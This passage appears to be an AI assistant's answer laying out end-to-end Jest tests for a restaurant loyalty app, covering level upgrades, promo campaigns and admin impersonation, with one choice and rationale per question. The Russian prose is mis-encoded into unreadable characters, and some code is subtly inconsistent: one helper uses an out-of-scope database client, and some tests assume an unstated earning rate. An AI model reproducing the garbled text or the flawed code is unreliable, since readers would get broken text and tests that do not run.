        posCheckId: 'CHK-2',
        tenantId: 'tenant-1',
        checkAmount: 2000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Transaction 3: 3000 —Ä—É–±
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-3',
        tenantId: 'tenant-1',
        checkAmount: 3000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Verify final balance
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(1600); // 1000 + 100 + 200 + 300
    expect(guestCard.totalSpent).toBe(6000); // 1000 + 2000 + 3000

    // Verify 3 notifications sent
    const notifications = await prisma.notification.findMany({
      where: { recipientId: 'user-1', type: 'BALLS_EARNED' },
    });

    expect(notifications).toHaveLength(3);
  });

  // Test: Notification delivery failure
  it('should retry notification on delivery failure', async () => {
    // Mock Telegram API failure
    jest.spyOn(telegramBot.telegram, 'sendMessage')
      .mockRejectedValueOnce(new Error('Network error'))
      .mockResolvedValueOnce({ ok: true });

    // Send webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-RETRY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    // Wait for retry
    await new Promise(resolve => setTimeout(resolve, 5000));

    // Verify notification eventually delivered
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'BALLS_EARNED' },
    });

    expect(notification.status).toBe('DELIVERED');
    expect(notification.attempts).toBeGreaterThan(1);
  });
});
```


***

### **13. Level Upgrade Flow - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π upgrade?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ì–æ—Å—Ç—å –¥–æ—Å—Ç–∏–≥ 10,000‚ÇΩ ‚Üí –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π upgrade Bronze ‚Üí Silver.

**–í–æ–ø—Ä–æ—Å:** E2E test —Å—Ü–µ–Ω–∞—Ä–∏–π?

- A) Manually update totalSpent to 10,000‚ÇΩ ‚Üí check level
- B) Simulate multiple transactions –¥–æ 10,000‚ÇΩ ‚Üí check level
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å notification "–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º —Å Silver!"
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ earnPercentage –∏–∑–º–µ–Ω–∏–ª—Å—è —Å 5% ‚Üí 7%

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Simulating real transactions = –±–æ–ª–µ–µ —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—ã–π —Ç–µ—Å—Ç
- Level upgrade notification = –≤–∞–∂–Ω—ã–π UX –º–æ–º–µ–Ω—Ç
- Earn percentage change = –ø—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ upgrade —Ä–µ–∞–ª—å–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Level Upgrade Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();
    await prisma.loyaltyLevel.deleteMany();

    // Create loyalty levels
    await prisma.loyaltyLevel.createMany({
      data: [
        {
          id: 'bronze',
          name: 'Bronze',
          tenantId: 'tenant-1',
          thresholdAmount: 0,
          earnPercentage: 5,
          color: '#CD7F32',
          priority: 1,
        },
        {
          id: 'silver',
          name: 'Silver',
          tenantId: 'tenant-1',
          thresholdAmount: 10000,
          earnPercentage: 7,
          color: '#C0C0C0',
          priority: 2,
        },
        {
          id: 'gold',
          name: 'Gold',
          tenantId: 'tenant-1',
          thresholdAmount: 50000,
          earnPercentage: 10,
          color: '#FFD700',
          priority: 3,
        },
      ],
    });

    // Create guest with Bronze level
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        telegramId: '123456789',
        guestProfile: {
          create: { firstName: '–ò–≤–∞–Ω' },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 0,
            totalSpent: 0,
            loyaltyLevelId: 'bronze',
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should upgrade from Bronze to Silver automatically', async () => {
    // STEP 1: Verify starting level
    let guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Bronze');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(5);
    expect(guestCard.totalSpent).toBe(0);

    // STEP 2: Make transactions totaling 10,000‚ÇΩ
    const transactions = [
      { amount: 3000, expectedBalls: 150 }, // 3000 * 5% = 150
      { amount: 2500, expectedBalls: 125 }, // 2500 * 5% = 125
      { amount: 2000, expectedBalls: 100 }, // 2000 * 5% = 100
      { amount: 1500, expectedBalls: 75 },  // 1500 * 5% = 75
      { amount: 1000, expectedBalls: 50 },  // 1000 * 5% = 50 ‚Üí UPGRADE!
    ];

    for (let i = 0; i < transactions.length; i++) {
      const tx = transactions[i];
      
      await request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send({
          posSystem: 'IIKO_CLOUD',
          posCheckId: `CHK-UPGRADE-${i}`,
          tenantId: 'tenant-1',
          checkAmount: tx.amount,
          guestPhone: '+79991234567',
          timestamp: new Date().toISOString(),
        })
        .expect(200);
    }

    // STEP 3: Verify level upgraded to Silver
    guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Silver');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(7);
    expect(guestCard.totalSpent).toBe(10000);

    // STEP 4: Verify balls earned correctly (Bronze rates)
    const totalBalls = 150 + 125 + 100 + 75 + 50;
    expect(guestCard.totalBalance).toBe(totalBalls);

    // STEP 5: Verify upgrade notification sent
    const upgradeNotification = await prisma.notification.findFirst({
      where: {
        recipientId: 'user-1',
        type: 'LEVEL_UPGRADED',
      },
    });

    expect(upgradeNotification).toBeTruthy();
    expect(upgradeNotification.message).toContain('Silver');
    expect(upgradeNotification.metadata).toMatchObject({
      previousLevel: 'Bronze',
      newLevel: 'Silver',
      newEarnPercentage: 7,
    });

    // STEP 6: Verify next transaction uses Silver rate (7%)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-POST-UPGRADE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const postUpgradeTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-POST-UPGRADE' },
    });

    expect(postUpgradeTx.amount).toBe(70); // 1000 * 7% = 70 (Silver rate!)

    guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(totalBalls + 70);
  });

  // Test: Upgrade to Gold
  it('should upgrade from Silver to Gold', async () => {
    // Pre-set guest to Silver with 45,000‚ÇΩ spent
    await prisma.guestCard.update({
      where: { id: 'card-1' },
      data: {
        totalSpent: 45000,
        loyaltyLevelId: 'silver',
      },
    });

    // Make transaction to reach 50,000‚ÇΩ
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-GOLD',
        tenantId: 'tenant-1',
        checkAmount: 5000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Gold');
    expect(guestCard.loyaltyLevel.earnPercentage).toBe(10);
    expect(guestCard.totalSpent).toBe(50000);

    // Verify upgrade notification
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'LEVEL_UPGRADED' },
    });

    expect(notification.message).toContain('Gold');
  });

  // Test: No upgrade if not reached threshold
  it('should NOT upgrade if threshold not reached', async () => {
    // Make transaction for 9,000‚ÇΩ (not enough for Silver)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-NO-UPGRADE',
        tenantId: 'tenant-1',
        checkAmount: 9000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
      include: { loyaltyLevel: true },
    });

    expect(guestCard.loyaltyLevel.name).toBe('Bronze'); // Still Bronze
    expect(guestCard.totalSpent).toBe(9000);

    // No upgrade notification
    const notification = await prisma.notification.findFirst({
      where: { recipientId: 'user-1', type: 'LEVEL_UPGRADED' },
    });

    expect(notification).toBeNull();
  });
});
```


***

–ü—Ä–æ–¥–æ–ª–∂–∞—é —Å –≤–æ–ø—Ä–æ—Å–∞–º–∏ **14-20** (E2E + Contract Testing)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

### **14. Promo Campaign Application - –≤—Ä–µ–º–µ–Ω–Ω–∞—è –∞–∫—Ü–∏—è?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Promo "–î–≤–æ–π–Ω—ã–µ –±–∞–ª–ª—ã –ø–æ –ø—è—Ç–Ω–∏—Ü–∞–º" –∞–∫—Ç–∏–≤–µ–Ω.

**–í–æ–ø—Ä–æ—Å:** E2E test?

- A) –°–æ–∑–¥–∞—Ç—å promo ‚Üí –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å
- B) Simulate transaction –≤ –ø—è—Ç–Ω–∏—Ü—É ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –±–∞–ª–ª–æ–≤ x2
- C) B + simulate transaction –≤ –ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫ ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–±—ã—á–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ promo –∏—Å—Ç—ë–∫ –ø–æ—Å–ª–µ end date

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- E2E = –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤–µ—Å—å lifecycle promo (create ‚Üí apply ‚Üí expire)
- Time-based conditions –∫—Ä–∏—Ç–∏—á–Ω—ã (–¥–µ–Ω—å –Ω–µ–¥–µ–ª–∏, –≤—Ä–µ–º—è)
- Expiration logic –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Promo Campaign Application (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.promo.deleteMany();
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();

    // Create test guest
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: { create: { firstName: '–ò–≤–∞–Ω' } },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            restaurantId: 'restaurant-1',
            totalBalance: 0,
            qrCode: 'qr-1',
            displayCode: '000001',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should apply promo "Double Balls Friday"', async () => {
    // STEP 1: Admin creates promo campaign
    const adminToken = await generateAdminToken('tenant-1');

    const promoResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Double Balls Friday',
        description: '–î–≤–æ–π–Ω—ã–µ –±–∞–ª–ª—ã –ø–æ –ø—è—Ç–Ω–∏—Ü–∞–º',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 2,
        conditions: {
          dayOfWeek: ['Friday'],
        },
        isActive: true,
      })
      .expect(201);

    const promoId = promoResponse.body.id;

    // Verify promo created
    const promo = await prisma.promo.findUnique({ where: { id: promoId } });
    expect(promo.name).toBe('Double Balls Friday');
    expect(promo.isActive).toBe(true);

    // STEP 2: Simulate transaction on Friday
    const fridayDate = new Date('2026-02-13T14:00:00Z'); // Friday, Feb 13, 2026
    jest.useFakeTimers().setSystemTime(fridayDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-FRIDAY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: fridayDate.toISOString(),
      })
      .expect(200);

    // Verify balls doubled (1000 * 10% * 2 = 200)
    const fridayTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-FRIDAY' },
    });

    expect(fridayTx.amount).toBe(200);
    expect(fridayTx.metadata.promoApplied).toBe(true);
    expect(fridayTx.metadata.promoId).toBe(promoId);
    expect(fridayTx.metadata.originalAmount).toBe(100); // Before multiplier

    // STEP 3: Simulate transaction on Monday
    const mondayDate = new Date('2026-02-16T14:00:00Z'); // Monday, Feb 16, 2026
    jest.setSystemTime(mondayDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-MONDAY',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: mondayDate.toISOString(),
      })
      .expect(200);

    // Verify normal balls (1000 * 10% = 100, NO multiplier)
    const mondayTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-MONDAY' },
    });

    expect(mondayTx.amount).toBe(100);
    expect(mondayTx.metadata.promoApplied).toBeUndefined();

    // STEP 4: Check final balance
    const guestCard = await prisma.guestCard.findUnique({
      where: { id: 'card-1' },
    });

    expect(guestCard.totalBalance).toBe(300); // 200 (Friday) + 100 (Monday)

    // STEP 5: Simulate transaction after promo end date
    const afterPromoDate = new Date('2026-03-06T14:00:00Z'); // March 6 (Friday, but after Feb 28)
    jest.setSystemTime(afterPromoDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-EXPIRED',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: afterPromoDate.toISOString(),
      })
      .expect(200);

    // Verify promo NOT applied (expired)
    const expiredTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-EXPIRED' },
    });

    expect(expiredTx.amount).toBe(100); // Normal rate
    expect(expiredTx.metadata.promoApplied).toBeUndefined();

    jest.useRealTimers();
  });

  // Test: Time-based promo (18:00-22:00)
  it('should apply promo "Happy Hour" during time range', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    // Create Happy Hour promo
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Happy Hour',
        description: '–¢—Ä–æ–π–Ω—ã–µ –±–∞–ª–ª—ã —Å 18:00 –¥–æ 22:00',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 3,
        conditions: {
          timeRange: {
            start: '18:00',
            end: '22:00',
          },
        },
        isActive: true,
      })
      .expect(201);

    // Transaction at 19:30 (inside range)
    const insideRangeDate = new Date('2026-02-14T19:30:00+03:00'); // Moscow time
    jest.useFakeTimers().setSystemTime(insideRangeDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-INSIDE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: insideRangeDate.toISOString(),
      })
      .expect(200);

    const insideTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-INSIDE' },
    });

    expect(insideTx.amount).toBe(300); // 1000 * 10% * 3 = 300

    // Transaction at 12:00 (outside range)
    const outsideRangeDate = new Date('2026-02-14T12:00:00+03:00');
    jest.setSystemTime(outsideRangeDate);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-OUTSIDE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: outsideRangeDate.toISOString(),
      })
      .expect(200);

    const outsideTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-OUTSIDE' },
    });

    expect(outsideTx.amount).toBe(100); // Normal rate

    jest.useRealTimers();
  });

  // Test: Min check amount condition
  it('should apply promo only for checks >= 5000‚ÇΩ', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Big Spender Bonus',
        description: '+50% –±–∞–ª–ª–æ–≤ –∑–∞ —á–µ–∫ –æ—Ç 5000‚ÇΩ',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 1.5,
        conditions: {
          minCheckAmount: 5000,
        },
        isActive: true,
      })
      .expect(201);

    // Transaction 6000‚ÇΩ (eligible)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-BIG',
        tenantId: 'tenant-1',
        checkAmount: 6000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const bigTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-BIG' },
    });

    expect(bigTx.amount).toBe(900); // 6000 * 10% * 1.5 = 900

    // Transaction 3000‚ÇΩ (not eligible)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-SMALL',
        tenantId: 'tenant-1',
        checkAmount: 3000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const smallTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-SMALL' },
    });

    expect(smallTx.amount).toBe(300); // 3000 * 10% = 300 (normal rate)
  });

  // Test: Multiple promos stacking
  it('should NOT stack multiple promos (highest priority wins)', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    // Promo 1: Double balls Friday (priority 1)
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Friday x2',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 2,
        priority: 1,
        conditions: { dayOfWeek: ['Friday'] },
        isActive: true,
      });

    // Promo 2: Triple balls 18-22 (priority 2 - lower)
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Happy Hour x3',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 3,
        priority: 2,
        conditions: { timeRange: { start: '18:00', end: '22:00' } },
        isActive: true,
      });

    // Transaction on Friday at 19:00 (both promos match!)
    const fridayEvening = new Date('2026-02-13T19:00:00+03:00');
    jest.useFakeTimers().setSystemTime(fridayEvening);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-BOTH',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: fridayEvening.toISOString(),
      });

    const tx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-BOTH' },
    });

    // Should apply highest priority promo (x2, not x3)
    expect(tx.amount).toBe(200); // 1000 * 10% * 2
    expect(tx.metadata.promoName).toBe('Friday x2');

    jest.useRealTimers();
  });
});

// Helper function
async function generateAdminToken(tenantId: string): Promise<string> {
  // Create admin user and return JWT token
  const admin = await prisma.user.create({
    data: {
      phone: '+79991111111',
      role: 'ADMIN',
      phoneVerified: true,
      tenant: { connect: { id: tenantId } },
    },
  });

  return jwt.sign(
    { userId: admin.id, role: 'ADMIN', tenantId },
    process.env.JWT_SECRET
  );
}
```


***

### **15. Admin Impersonation Flow - Owner ‚Üí Manager view?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Owner –º–æ–∂–µ—Ç "–≤–æ–π—Ç–∏" –∫–∞–∫ Manager –¥–ª—è troubleshooting.

**–í–æ–ø—Ä–æ—Å:** E2E test?

- A) Owner login ‚Üí click "Impersonate Manager" ‚Üí check UI
- B) A + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ Manager –≤–∏–¥–∏—Ç —Ç–æ–ª—å–∫–æ —Å–≤–æ–∏ –¥–∞–Ω–Ω—ã–µ
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ audit log –∑–∞–ø–∏—Å–∞–ª impersonation
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å "Exit Impersonation" ‚Üí Owner view restored

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Impersonation = sensitive feature (security risk –µ—Å–ª–∏ –Ω–µ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ)
- Audit log –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω –¥–ª—è compliance
- Exit impersonation –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Admin Impersonation Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.auditLog.deleteMany();
    await prisma.user.deleteMany();
    await prisma.tenant.deleteMany();

    // Create tenant
    const tenant = await prisma.tenant.create({
      data: {
        id: 'tenant-1',
        name: 'Test Restaurant',
        slug: 'test-restaurant',
        status: 'ACTIVE',
      },
    });

    // Create Owner
    await prisma.user.create({
      data: {
        id: 'owner-1',
        phone: '+79991111111',
        email: 'owner@example.com',
        role: 'OWNER',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });

    // Create Manager
    await prisma.user.create({
      data: {
        id: 'manager-1',
        phone: '+79992222222',
        email: 'manager@example.com',
        role: 'MANAGER',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });

    // Create Admin
    await prisma.user.create({
      data: {
        id: 'admin-1',
        phone: '+79993333333',
        email: 'admin@example.com',
        role: 'ADMIN',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should allow Owner to impersonate Manager', async () => {
    // STEP 1: Owner logs in
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Verify Owner can access owner-only endpoint
    const ownerResponse = await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${ownerToken}`)
      .expect(200);

    expect(ownerResponse.body.tenantId).toBe('tenant-1');

    // STEP 2: Owner impersonates Manager
    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    expect(impersonationToken).toBeTruthy();

    // Decode impersonation token
    const decoded = jwt.verify(impersonationToken, process.env.JWT_SECRET) as any;
    expect(decoded.userId).toBe('manager-1'); // Acting as Manager
    expect(decoded.role).toBe('MANAGER');
    expect(decoded.impersonatedBy).toBe('owner-1'); // But impersonated by Owner
    expect(decoded.isImpersonating).toBe(true);

    // STEP 3: Verify Manager-level access only
    // Manager can access guests
    const guestsResponse = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    expect(guestsResponse.body).toBeTruthy();

    // Manager CANNOT access owner-only settings
    await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(403); // Forbidden

    // STEP 4: Verify audit log created
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'IMPERSONATION_STARTED',
        userId: 'owner-1',
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.metadata).toMatchObject({
      targetUserId: 'manager-1',
      targetRole: 'MANAGER',
    });

    // STEP 5: Exit impersonation
    const exitResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate/exit')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    const restoredToken = exitResponse.body.originalToken;

    // Verify restored to Owner
    const restoredDecoded = jwt.verify(restoredToken, process.env.JWT_SECRET) as any;
    expect(restoredDecoded.userId).toBe('owner-1');
    expect(restoredDecoded.role).toBe('OWNER');
    expect(restoredDecoded.isImpersonating).toBeUndefined();

    // Owner can access owner-only endpoint again
    await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${restoredToken}`)
      .expect(200);

    // STEP 6: Verify exit audit log
    const exitAuditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'IMPERSONATION_ENDED',
        userId: 'owner-1',
      },
    });

    expect(exitAuditLog).toBeTruthy();
  });

  // Test: Manager CANNOT impersonate Owner
  it('should prevent Manager from impersonating Owner', async () => {
    const managerToken = jwt.sign(
      { userId: 'manager-1', role: 'MANAGER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${managerToken}`)
      .send({ targetUserId: 'owner-1' })
      .expect(403); // Forbidden - cannot impersonate higher role
  });

  // Test: Cannot impersonate across tenants
  it('should prevent cross-tenant impersonation', async () => {
    // Create another tenant with Manager
    await prisma.tenant.create({
      data: {
        id: 'tenant-2',
        name: 'Other Restaurant',
        slug: 'other-restaurant',
        status: 'ACTIVE',
      },
    });

    await prisma.user.create({
      data: {
        id: 'manager-2',
        phone: '+79994444444',
        role: 'MANAGER',
        phoneVerified: true,
        tenantId: 'tenant-2',
      },
    });

    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to impersonate Manager from different tenant
    await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-2' }) // Different tenant!
      .expect(403);
  });

  // Test: Impersonation banner in UI
  it('should return impersonation info in user profile', async () => {
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    // Get user profile
    const profileResponse = await request(app.getHttpServer())
      .get('/api/v1/auth/me')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    expect(profileResponse.body.isImpersonating).toBe(true);
    expect(profileResponse.body.impersonatedBy).toMatchObject({
      id: 'owner-1',
      email: 'owner@example.com',
      role: 'OWNER',
    });
  });

  // Test: Impersonation timeout (security)
  it('should expire impersonation token after 1 hour', async () => {
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    // Simulate 2 hours later
    jest.useFakeTimers().setSystemTime(Date.now() + 2 * 60 * 60 * 1000);

    // Token should be expired
    await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(401); // Unauthorized - token expired

    jest.useRealTimers();
  });
});
```


***

